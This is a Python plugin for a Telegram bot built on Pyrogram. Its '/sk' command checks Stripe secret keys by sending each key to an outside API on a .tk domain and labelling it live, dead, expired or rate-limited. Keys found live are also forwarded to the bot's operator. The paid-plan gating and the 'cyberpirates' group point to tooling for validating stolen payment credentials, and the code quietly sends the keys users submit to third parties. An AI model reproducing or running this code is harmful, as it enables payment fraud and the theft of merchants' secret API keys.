from pyrogram import Client, filters
import requests
from plugins.func.users_sql import *
session = requests.session()
@Client.on_message(filters.command ('sk'))
async def cmd_add(Client,message):
  try:
  #NES TOOLS
    user_id = str(message.from_user.id)
    chat_type = str(message.chat.type)
    chat_id = str(message.chat.id)
    regdata = fetchinfo(user_id)
    results = str(regdata)
    if results=='None':
      resp = "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥𝗘𝗗 𝗬𝗘𝗧 ⚠️. 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥 𝗙𝗜𝗥𝗦𝗧 𝗕𝗬 𝗨𝗦𝗜𝗡𝗚 /register 𝗧𝗢 𝗨𝗦𝗘 𝗠𝗘."
      await message.reply_text(resp,message.id)
    else:
      #
      #PLAN CHECK 
      await plan_expirychk(user_id)
      #PM AND AUTH CHECK
      pm = fetchinfo(user_id)
      status = pm[2]
      role = status
      GROUP = open("plugins/group.txt").read().splitlines()
      if chat_type=="ChatType.PRIVATE" and status=="FREE" :
        resp = "𝗢𝗡𝗟𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗘𝗠𝗕𝗘𝗥𝗦 𝗔𝗥𝗘 𝗔𝗟𝗟𝗢𝗪𝗘𝗗 𝗧𝗢 𝗨𝗦𝗘 𝗕𝗢𝗧 𝗜𝗡 𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 ⚠️.𝗬𝗢𝗨 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗙𝗥𝗘𝗘𝗟𝗬 𝗕𝗢𝗧 𝗛𝗘𝗥𝗘 @cyberpirateschats"
        await message.reply_text(resp,message.id)
      
      elif chat_type=="ChatType.GROUP" or   chat_type=="ChatType.SUPERGROUP" and chat_id not in GROUP:
        resp = "𝗨𝗡𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗖𝗛𝗔𝗧 ❌. 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 @mtctechx 𝗧𝗢 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘."
        await message.reply_text(resp,message.id)
      else:
        if message.reply_to_message:
          sk = message.reply_to_message.text
        else:
          sk = message.text[len('/sk '):]
        if len(sk) == 0:
            nocc = """
  𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔 𝗦𝗞 𝗞𝗘𝗬 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️
          """
            return await message.reply_text(nocc,message.id)
        else:
          chkst = "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗦𝗞 𝗪𝗮𝗶𝘁...."
          done = await message.reply_text(chkst,message.id)
          skchk = f"https://mainulhasanbd.tk/skchk/api.php?lista={sk}"
          skinfo = requests.get(skchk)
          result = skinfo.text
          if "tok_" in result:
            ss = "𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅"
            st = "SK LIVE 💚"
            hits = f"""
KEY: <code>{sk}</code>

Result: {st}
"""
            await send_mtc(hits)
          elif "Invalid API Key provided" in result:
            ss = "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
            st = "INVALID KEY GIVEN ❌"
          elif "rate_limit" in result:
            ss = "𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅"
            st = "RATE LIMIT ⚠️"
            hits = f"""
KEY: <code>{sk}</code>

Result: {st}
            """
            await send_mtc(hits)
          elif "testmode_charges_only" in result or "test_mode_live_card" in result:
            ss= "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
            st = "TESTMODE CHARGES ONLY ❌"
          elif "api_key_expired" in result:
            ss = "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
            st = "EXPIRED KEY ❌"
          elif "generic_decline" in result:
            ss = "𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅"
            st = "SK LIVE 💚"
          else:
            ss = "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
            st = skinfo.text
          
          resp = f"""
{ss}

𝗞𝗘𝗬: <code>{sk}</code>

𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: <b>{st}</b>

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> [ {role} ]

𝗕𝗼𝘁 𝗕𝘆 <a href="tg://user?id=1386134927">[ 🇧🇩 ] ＭＴＣＴＥＣＨＸ 👑</a>
          """
          await Client.edit_message_text(message.chat.id,done.id,resp)
  except Exception as e:
      print(e)